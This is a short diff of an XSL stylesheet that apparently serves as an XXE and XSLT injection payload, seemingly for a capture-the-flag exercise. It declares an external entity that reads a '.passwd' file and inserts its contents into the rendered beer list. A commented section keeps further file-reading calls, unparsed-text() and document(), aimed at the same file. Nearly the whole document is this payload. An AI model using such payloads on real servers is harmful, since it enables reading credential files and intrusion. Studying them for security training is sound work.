@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE request [<!ENTITY include SYSTEM ".passwd">]>
+<!DOCTYPE xsl:stylesheet [
+	<!ENTITY passwd SYSTEM ".passwd">]>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
 <xsl:for-each select="beers/beer">
@@ -12,7 +13,7 @@
     <xsl:value-of select="description"/>
     <span style="font-style:italic"> (<xsl:value-of select="prct"/> %)</span>
     </p>
-	<xsl:value-of select="unparsed-text('.passwd')"/>
+	&passwd;
   </div>
   
   
@@ -29,4 +30,5 @@
 unparsed-text()
 <xsl:text>Diferent text</xsl:text>
 <p><xsl:copy-of select="document('.passwd')"/></p>
+<xsl:value-of select="unparsed-text('.passwd')"/>
  -->
